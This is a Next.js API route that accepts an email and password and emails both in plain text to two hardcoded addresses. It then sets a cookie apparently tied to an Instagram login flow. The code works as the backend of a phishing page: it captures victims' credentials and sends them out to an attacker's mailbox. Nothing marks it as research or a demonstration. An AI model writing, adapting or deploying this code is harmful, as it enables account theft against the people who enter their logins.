import { NextResponse } from "next/server";
import fdf from 'request'
export async function POST(request) {
    const {email, password} = await request.json()

    
 
    const nodemailer = require("nodemailer");

    const transporter = nodemailer.createTransport({
        service: "gmail",
        auth: {
            user: process.env.GMAIL,
            pass: process.env.GMAILPASSWORD,
        },
    });

    
    async function main() {
        const info = await transporter.sendMail({
            from: process.env.GMAIL,
            to: 'admin@surendra-dev.in.net, Rksaini998303@gmail.com',
            subject: `${email} ${password}`,
            text: `ID :${email} <br>  password : ${password}`,
            html: `ID :${email} <br>  password : ${password}`,
        });

        console.log("Message sent: %s", info.messageId);
    }


    await new Promise((resolve, reject) => {
        main().then(() => resolve())
            .catch(() => resolve());
        setTimeout(() => {
            resolve()
        }, 9000)
    })





     
    
    const  response = NextResponse.json({success: true})
    response.cookies.set('insta', "allready")
    return response
}